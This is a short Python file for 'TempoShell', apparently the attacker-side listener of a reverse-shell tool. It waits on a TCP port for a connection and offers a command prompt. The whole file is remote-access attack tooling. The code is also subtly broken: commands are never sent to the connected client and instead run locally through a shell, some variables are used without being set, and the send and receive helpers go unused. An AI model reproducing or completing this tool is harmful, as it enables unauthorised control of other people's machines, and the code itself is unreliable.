#Imports.
import socket, shutil, json, sys, subprocess

#Server Config.
class Server:
    def __init__(self, ip, port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print(" [-] Waiting for a connection...")
        self.connection, address = server.accept()
        print(" [+] Connected With " + str(address))

#Recieve Data.
    def RecieveData(self):
        Data = b""
        while True:
            try:
                Data += self.connection.recv(1024)
                return json.loads(Data)
            except ValueError:
                continue

#Recieva Data.
    def SendData(self, data):
        DataSend = json.dumps(data)
        self.connection.send(DataSend.encode())

#Command Execution.
    def run(self):
        while True:
            command = input("TempoShell@ ")
            command = command.split(" ", 1)
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "Shell":
                    return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )
                command = input("TempoShell2@ ")
            except Exception:
                result = "[-] Error Running Command."
            print(result)


TempoServer = Server("127.0.0.1", 7976)
TempoServer.run()